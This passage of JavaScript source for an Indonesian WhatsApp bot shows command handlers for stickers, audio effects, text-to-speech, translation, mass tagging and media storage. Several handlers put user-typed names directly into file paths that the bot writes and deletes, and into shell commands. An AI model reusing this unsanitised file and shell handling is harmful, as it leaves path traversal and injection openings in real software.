																		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																			if (error) return reply(mess.error)
																			Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																			fs.unlinkSync(media)
																			fs.unlinkSync(`./sticker/${sender}.webp`)
																			fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
																			})
																			})
																			.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
																			.toFormat('webp')
																			.save(`./sticker/${sender}.webp`)
																			} else if (isQuotedSticker) {
																				let encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
																				let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
																				exif.create(packname1, author1, `takestick_${sender}`)
																				exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																				if (error) return reply(mess.error)
																				Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																				fs.unlinkSync(media)
																				fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
																				})
																				} else {
																					reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
																				 }
																			}
																	 break
						case 'sticker': case 'stiker':  case 'stickergif': case 'stikergif': case 'sgif': case 's':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if ( isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
										await ffmpeg(`${media}`)
										.input(media)
										.on('start', function (cmd) {
											console.log(color(`STARTED : ${cmd}`))
											})
											.on('error', function (err) {
												console.log(color(`ERROR : ${err}`))
												fs.unlinkSync(media)
												reply(mess.error)
												})
												.on('end', function () {
													console.log(color(`FINISH`,'magenta'))
													exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
														if (error) return reply(mess.error)
														Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
														limitAdd(sender, limit)
														fs.unlinkSync(media)
														fs.unlinkSync(`./sticker/${sender}.webp`)
														})
														})
														.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
														.toFormat('webp')
														.save(`./sticker/${sender}.webp`)
														} else if ((isQuotedVideo && Ofc.message.videoMessage.fileLength < 10000000 || isQuotedVideo && Ofc.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
															let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
															let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
															reply(mess.wait)
															await ffmpeg(`${media}`)
															.inputFormat(media.split('.')[4])
															.on('start', function (cmd) {
																console.log(color(`STARTED : ${cmd}`))
																})
																.on('error', function (err) {
																	console.log(color(`ERROR : ${err}`))
																	fs.unlinkSync(media)
																	let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
																	reply(mess.error)
																	})
																	.on('end', function () {
																		console.log(color(`FINISH`,'magenta'))
																		exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																			if (error) return reply(mess.error)
																			Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																			limitAdd(sender, limit)
																			fs.unlinkSync(media)
																			fs.unlinkSync(`./sticker/${sender}.webp`)
																			})
																			})
																			.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
																			.toFormat('webp')
																			.save(`./sticker/${sender}.webp`)
																			} else {
																				reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
																				}
																				limitAdd(sender, limit)
												break
						case 'exif':
									if (!Ofc.key.fromMe && !isOwner)return reply(mess.only.owner)
									if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|author`)
									if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
									exif.create(arg.split('|')[0], arg.split('|')[1])
									reply('Sukses Lord')
									break
						case 'owner':{
							const ownerContact = [owner_number, "", "", "", "", "", "", "", "", "", ""]
							let ini_list = []
							for (let i of ownerContact.map(v => v + '@s.whatsapp.net')) {
								const vname = Zeeone.contacts[i] != undefined ? Zeeone.contacts[i].vname || Zeeone.contacts[i].notify : undefined
								ini_list.push({
									"displayName": `${owner_name}`,
									"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
									})
									}
									hehe = await Zeeone.sendMessage(from, {
										"displayName": `${ini_list.length} kontak`,
										"contacts": ini_list 
										}, 'contactsArrayMessage', { quoted: Ofc })
										Zeeone.sendMessage(from, `Nih Kak Contact Owner Ku ✨`, text, {quoted: hehe})
										}
										break
						case 'lirik':
									if (args.length < 1) return reply('Judulnya?')
									reply(mess.wait)
									teks = body.slice(7)
									lirikLagu(teks).then((res) => {
										let lirik = `*Hasil Pencarian Dari : ${q}*
										\n${res[0].result}`
										reply(lirik)
									})
									break
						case 'ultah': case 'hbd':
									if (args.length < 1) return reply(`Usage : #ultah tahun-bulan-tanggal\nExample : #ultah 2004-01-12`)
									if (!args[0].includes("-")) return reply(`Usage : #ultah tahun-bulan-tanggal\nExampla : #ultah 2006-01-12`)
									qq = q
									zodiakk = [
									["Capricorn", new Date(1970, 0, 1)],
									["Aquarius", new Date(1970, 0, 20)],
									["Pisces", new Date(1970, 1, 19)],
									["Aries", new Date(1970, 2, 21)],
									["Taurus", new Date(1970, 3, 21)],
									["Gemini", new Date(1970, 4, 21)],
									["Cancer", new Date(1970, 5, 22)],
									["Leo", new Date(1970, 6, 23)],
									["Virgo", new Date(1970, 7, 23)],
									["Libra", new Date(1970, 8, 23)],
									["Scorpio", new Date(1970, 9, 23)],
									["Sagittarius", new Date(1970, 10, 22)],
									["Capricorn", new Date(1970, 11, 22)]
									].reverse()
									function getZodiac(month, day) {
										dey = new Date(1970, month - 1, day)
										return zodiakk.find(([_,_d]) => dey >= _d)[0]
										}
										dateek = new Date(qq)
										if (dateek == 'Invalid Date') throw dateek
										let dd = new Date()
										let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
										birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]
										zodiackk = getZodiac(birth[1], birth[2])
										ageD = new Date(d - dateek)
										agek = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()
										birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
										cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat ulang tahun yang ke-${agek} 🥳` : agek
										reply(`
*Lahir : ${birth.join(', ')}*
*Ultah Mendatang : ${birthday.join(', ')}*
*Usia : ${cekusia}*
*Zodiak : ${zodiackk}*
`.trim())
									break
						case 'bass': 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
										break
						case 'slowmo': case 'slow':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											uhh = fs.readFileSync(ran)
											Zeeone.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc,duration:999999999999})
											fs.unlinkSync(ran)
											})
											} catch (e) {
												reply(mess.error)
												}  
												limitAdd(sender, limit)
									break
						case 'fast':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc})
											fs.unlinkSync(ran)
											})
											} catch (e) {
												reply(mess.error)
												}  
										limitAdd(sender, limit)
									break
						case 'robot':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'detikvn': case 'setdetikvn': case 'setdurasi':
									if (!Number(args[0])) return reply(`EXAMPLE : ${prefix + command} 50`)
									reply(mess.wait)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									cokmatane = Number(args[0])
									hah = fs.readFileSync(media)
									Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted: Ofc})
									fs.unlinkSync(media)
									limitAdd(sender, limit)
									break
						case 'tupai':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc,duration:99})
											fs.unlinkSync(ran)
											})
											 } catch (e) {	
												reply(mess.error)
												}  	
												limitAdd(sender, limit)
												break
						case 'vibra': case 'vibrato':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=16" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'tinyurl':{
									if (args.length < 1) return reply(`Masukkan link`)
									if (!isUrl) return reply(`Masukkan link`)
									const fetchText = (url, optiono) => {
										return new Promise((resolve, reject) => {
											return fetch(url, optiono)
											.then(response => response.text())
											.then(text => resolve(text))
											.catch(err => {
												console.log(color(err,'red'))
												reject(err)
												})
											})
										}
										okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
										shorti = `*Result : ${okok}*`
										reply(shorti)
										}
									break
						case 'infoall': case 'tagall':
									if (!isGroupAdmins && !Ofc.key.fromMe && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									var nom = Ofc.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`『 *TAG ALL*  』
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
						case 'hidetag': 
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										hideTag(from, `${q}`) 
										} else {  
											quotedText = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
											hideTag(from, `${quotedText}`)
											}
									break
						case 'tts': case 'say':
									try {if (args.length > 50) return reply('```Error, Teks Terlalu Panjang!```')
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										const gtts = require('./lib/gtts')(args[0])
										dtt = body.slice(8)
										ranm = getRandom('.mp3')
										rano = getRandom('.ogg')
										dtt.length > 50
										? reply('```Error, Teks Terlalu Panjang!```')
										: gtts.save(ranm, dtt, function() {
											exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
												fs.unlinkSync(ranm)
												buff = fs.readFileSync(rano)
												if (err) return reply(mess.error)
												Zeeone.sendMessage(from, buff, audio, {quoted: Ofc, ptt:true})
												fs.unlinkSync(rano)
												})
												})
												} else {
													const gtts = require('./lib/gtts')(args[0]?args[0]:'id')
													dtt = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
													ranm = getRandom('.mp3')
													rano = getRandom('.ogg')
													dtt.length > 50
													? reply('```Error, Teks Terlalu Panjang!```')
													: gtts.save(ranm, dtt, function() {
														exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
															fs.unlinkSync(ranm)
															buff = fs.readFileSync(rano)
															if (err) return reply(mess.error)
															Zeeone.sendMessage(from, buff, audio, {quoted: Ofc, ptt:true})
															fs.unlinkSync(rano)
															})
														})
													}
												} catch (e) {
													reply(`${e}`)
													}
												limitAdd(sender, limit)
											break
						case 'translate': case 'tr':
									try {
										if (args.length < 1)return reply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
										if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
											translate(`${body.slice(10+args[0].length+1)}`, args[0])
											.then((res) => { reply(`${res}`) })
											} else {
												tolang = args[0]
												entah = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
												translate(entah, tolang)
												.then((res) => { reply(`${res}`) })
												}
											} catch (e) {
												reply(`${e}`)
												}
											break
						case 'mystat': case 'stats': case 'botstat': case 'infobot':{
									try {
										let totalchat = await Zeeone.chats.all()
										let i = []
										let giid = []
										for (let mem of totalchat){
											i.push(mem.jid)
											}
											for (let id of i){
												if (id && id.includes('g.us')){
													giid.push(id)
													}
												}
												const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Zeeone.user.phone
												nupe = owner_number + '@s.whatsapp.net'
												teks = `『 *BOT STATISTIC* 』 

🔖 Botname : ${namabot}
🔖 Owner : @${nupe.split("@")[0]}
🔖 Prefix : ${nopref?'No prefix':multiprefix?'Multi prefix':prefix}
🔖 Runtime : ${kyun(process.uptime())}
🔖 Speed : ${processsTime(Ofc.messageTimestamp.low, moment())}s
🔖 Status : ${public_mode? `Public Mode`:`Self Mode`}
🔖 Total Hit : -
🔖 Personal Chat : ${totalchat.length - giid.length}
🔖 Group Chat : ${giid.length}
🔖 Total Chat : ${totalchat.length}
🔖 Total User : ${_user.length}
🔖 Total Block : ${blocked.length}
🔖 Total Baned : ${ban.length}

🏷️ Anti Call : ${setting.anti_call}
🏷️ Anti Delete : ${setting.anti_delete}
🏷️ Auto Register : ${autoregister}
🏷️ Auto Respond : ${autorespon? `False` : `True`}
🏷️ Multi Prefix : ${multiprefix}
🏷️ Anti Delete : ${menusimple? `False` : `True`}

『 *PHONE STATISTIC* 』
 
🔖 Whatsapp Ver. : ${wa_version}
🔖 Ram Usage : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
🔖 Mcc : ${mcc}
🔖 Mnc : ${mnc}
🔖 Versi OS : ${os_version}
🔖 Merk HP : ${device_manufacturer}
🔖 Versi HP : ${device_model}
🔖 Browser : ${Zeeone.browserDescription}
🔖 Baterai : ${isBattre} %
🔖 Charging : ${isCharge}
`
let qqppp = [{
                    "buttonId": `${prefix}owner`,
                    "buttonText": {
                        "displayText": "OWNER"
                    },
                    "type": "RESPONSE"
                },{
                    "buttonId": `${prefix}sewa`,
                    "buttonText": {
                        "displayText": "SEWA"
                    },
                    "type": "RESPONSE"
                }]
                sendButLocation(from, teks, `LordUserbot™© | Allright Reserved.`, thumbnail, qqppp, {contextInfo: { mentionedJid: [nupe]}})
				
} catch (e){
reply(`${e}`)
}
}
break
						case 'clearall':{
									if (!isOwner && !Ofc.key.fromMe) return
									let chiit = await Zeeone.chats.all()
									for (let i of chiit){
										Zeeone.modifyChat(i.jid, 'clear', {
											includeStarred: false
											})
											}
											reply(`Succes Lord`)
											}
									break
						case 'tes': case 'test': case 'ping':{
									reply(`${runtime2}`)
									}
									break
						case 'cekapikey':
									if (!isOwner && !Ofc.key.fromMe) return
									anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${lolkey}`)
									teks = `─『 *APIKEY CEK* 』─\n\n➸ *Username :* ${anu.result.username}\n➸ *REQUEST :* ${anu.result.requests}\n➸ *Today :* ${anu.result.today}\n➸ *Akun Type :* ${anu.result.account_type}\n➸ *Expired :* ${anu.result.expired}`
									Zeeone.sendMessage(`${ownerNumber}`, teks, text, {quoted: Ofc})
									break
						case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
									})
									}
									break
						case 'getpic': case 'getpp': case 'getprofile':{
									if (!isGroup) return reply(mess.only.group)
									reply(mess.wait)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return
									mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
									try {
										pp = await Zeeone.getProfilePicture(mentioned)
										} catch {
											pp = `${imagebb}`
											}
											buffer = await getBuffer(pp)
											Zeeone.sendMessage(from, buffer, image, {quoted: Ofc, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail: thumbnail, contextInfo:{mentionedJid:[mentioned]}})
											}
									break
						case 'getnum': case 'getnomor': case 'getnumber':
									if (!isGroup) return reply(mess.only.group)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return reply('Reply Pesan Target Lord')
									mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
									reply(`${mentioned.split('@')[0]}`)
									break
						case 'towame':
									if (Ofc.message.extendedTextMessage != undefined){
										mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										reply(`wa.me/`+mentioned.split("@")[0])
										} else {
											reply(`${prefix+command} @tag atau reply`)
											}
											break
						case 'wame':
									wamo = q.replace(new RegExp("[()/ ]", "gi"), "+")
									reply(q?`wa.me/`+sender.split("@")[0]+'?text='+wamo: `wa.me/`+sender.split("@")[0])
									break
						case 'sendkontak': case 'kontak':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (Ofc.message.extendedTextMessage != undefined){
										mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										const ynkos = 'BEGIN:VCARD\n' 
										+ 'VERSION:3.0\n' 
										+ `FN:${q?q:`KONTAK`}\n`
										+ `ORG:KONTAK;\n`
										+ `TEL;type=CELL;type=VOICE;waid=${mentioned.split("@")[0]}:+${mentioned.split("@")[0]}\n`
										+ 'END:VCARD'
										Zeeone.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: Ofc})
										} else {
											const ynkos = 'BEGIN:VCARD\n' 
											+ 'VERSION:3.0\n' 
											+ `FN:${q.split('|')[1]}\n`
											+ `ORG:KONTAK;\n`
											+ `TEL;type=CELL;type=VOICE;waid=${q.split('|')[0]}:+${q.split('|')[0]}\n`
											+ 'END:VCARD'
											Zeeone.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: Ofc})
											}
									break 
						case 'notif':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									teks = `Notif Dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
									group = await Zeeone.groupMetadata(from);
									member = group['participants']
									jids = [];
									member.map(async adm => {
										jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
										})
										options = {
											text: teks,
											contextInfo: {
												mentionedJid: jids
												},
												quoted: Ofc
												}
												await Zeeone.sendMessage(from, options, text)
												limitAdd(sender, limit)
										break
						case 'addvn': case 'addaudio': case 'addmusic':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedAudio) return reply('Reply Audionya Lord')
									if (!q) return reply('Nama Audionya Apa Lord?')
									let addvn = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let delb = await Zeeone.downloadMediaMessage(addvn)
									audionye.push(q)
									fs.writeFileSync(`./database/audio/${q}.mp3`, delb)
									fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
									reply(`Sukses Menambahkan Audio!\nCek Audio Dengan Cara Ketik ${prefix}listvn`)
									break
						case 'delaudio': case 'delvn': case 'deletevn':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Audio Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/audio/${q}.mp3`)
										let delaudio = audionye.indexOf(q)
										audionye.splice(delaudio, 1)
										fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
										reply(`Succes Menghapus Audio ${q}!`)
										await sleep(5000)
										} catch (err) {
											console.log(err)
											reply(`Gagal Menghapus Audio ${q}!`)
										}
									break
						case 'listvn': case 'listaudio':
									Zeeone.updatePresence(from, Presence.avaible) 
									teks = '*『 LIST AUDIO 』*\n\n'
									for (let awokwkwk of audionye) {
										teks += `📊 ${awokwkwk}\n`
										}
										teks += `\n*TOTAL :* ${audionye.length}`
										reply(`${teks}`)
									break
						case 'addimage': case 'addfoto': case 'addphoto':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedImage) return reply('Reply Photonya Lord')
									if (!q) return reply('Nama Photonya Apa Lord?')
									let addimage = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let dellb = await Zeeone.downloadMediaMessage(addimage)
									imagenye.push(q)
									fs.writeFileSync(`./database/image/${q}.jpg`, dellb)
									fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
									reply(`Sukses Menambahkan Image!\nCek Image Dengan Cara Ketik ${prefix}listimage`)
									break
						case 'delimage': case 'deleteimage': case 'delfoto': case 'delphoto':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Sticker Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/image/${q}.webp`)
										let delimage = imagenye.indexOf(q)
										imagenye.splice(delimage, 1)
										fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
										reply(`Succes Menghapus Image ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus Image ${q}!`)
										}
									break
						case 'listimage': case 'listphoto': case 'listfoto': 
									let listimage = '*『 LIST STICKER 』*\n\n'
